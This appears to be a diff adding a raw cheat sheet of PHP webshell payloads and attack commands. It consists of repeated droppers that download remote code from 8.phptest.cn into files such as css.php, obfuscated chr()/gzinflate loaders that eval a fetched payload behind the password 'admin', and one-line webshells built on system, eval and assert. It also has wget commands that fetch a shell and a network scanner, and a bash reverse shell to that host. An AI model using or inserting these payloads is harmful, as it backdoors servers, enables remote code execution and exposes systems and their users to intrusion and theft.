@@ -1,0 +1,123 @@
+
+
+
+
+<?php file_put_contents('./css.php',file_get_contents('http://8.phptest.cn/php/o.txt')) ?>
+
+
+<?php echo copy('http://8.phptest.cn/php/o.txt','niubi.php');?>
+
+<?php echo copy('http://8.phptest.cn/php/c1.txt','niubi.php');?>
+
+<?php file_put_contents('./css.php',file_get_contents('http://8.phptest.cn/php/o1.txt')) ?>
+
+
+<?php $save=file_get_contents("http://8.phptest.cn/php/o.txt");  file_put_contents ("css.php",$save) ?>
+
+
+
+<?php file_put_contents('css.php',file_get_contents('http://8.phptest.cn/php/o.txt')) ?>
+
+
+
+<?php file_put_contents('css1.php',file_get_contents('http://8.phptest.cn/php/o1.txt')) ?>
+
+
+
+<script language="php"><?php file_put_contents('./css.php',file_get_contents('http://8.phptest.cn/php/o.txt'))?></script>   
+
+
+<script language="php">file_put_contents('./css.php',file_get_contents('http://8.phptest.cn/php/o.txt'))?></script>
+
+
+<?php
+set_time_limit(666);
+$i = array("cms","chr","http://","8.phptest.cn/","404.jpg");
+s($i[1],$i[2].$i[3].$i[4]);
+session_start();
+function s($c,$url){
+if(empty($_SESSION['PhpCode'])){
+	$_SESSION['PhpCode']=file_get_contents($url);
+	m($_SESSION['PhpCode'],$c);
+	}		
+}
+function m($a,$c){
+	$unzip=$c(103).$c(122).$c(105).$c(110);
+	$unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);
+	$ss = "";
+	l($unzip($a),$ss);
+}
+function l($xx,$ss){
+	$password = "admin";
+	@eval($xx.$ss);
+}
+?>
+
+
+
+<?php
+$password='admin';//鐧诲綍瀵嗙爜
+//----------鍔熻兘绋嬪簭------------------//
+$c="chr";
+session_start();
+if(empty($_SESSION['PhpCode'])){
+$url = 'http://8.phptest.cn/404.jpg';
+$get=chr(102).chr(105).chr(108).chr(101).chr(95);
+$get.=chr(103).chr(101).chr(116).chr(95).chr(99);
+$get.=chr(111).chr(110).chr(116).chr(101).chr(110);
+$get.=chr(116).chr(115);
+$_SESSION['PhpCode']=$get($url);
+}
+$unzip=$c(103).$c(122).$c(105).$c(110);
+$unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);
+@eval($unzip($_SESSION['PhpCode']));
+?>
+
+
+wget -O c.php http://8.phptest.cn/php/c.txt
+
+wget -O fscan http://8.phptest.cn/fscan
+
+bash -i >& /dev/tcp/8.phptest.cn/4455 0>&1
+
+
+<?=phpinfo()?> 
+
+<?=system($_GET[c]);?>
+
+<?=phpinfo();
+
+<?php array_map('assert',$_GET); ?>
+    
+<?php assert(php://input); ?>
+    
+forward_static_call_array(assert,array($_POST[x]));
+    
+<?php phpinfo();;unlink(__FILE__);?>
+
+
+
+
+<?php eval($_REQUEST['a'])?>
+
+post
+a=phpinfo();
+
+
+http://8.phptest.cn/php/mysql.txt
+
+win
+slmgr /skms kms.v0v.bid && slmgr /ato
+
+<?php class test{
+    private $file = '3.php';
+    private $url = 'http://8.phptest.cn/php/o.txt';
+    function __construct($copy)
+    {
+        $copy($this->url,$this->file);
+    }
+}
+new test('copy');?>
+
+
+<?php file_put_contents('1.php',base64_decode ('PD9waHAgcGhwaW5mbygpOz8+'))?>
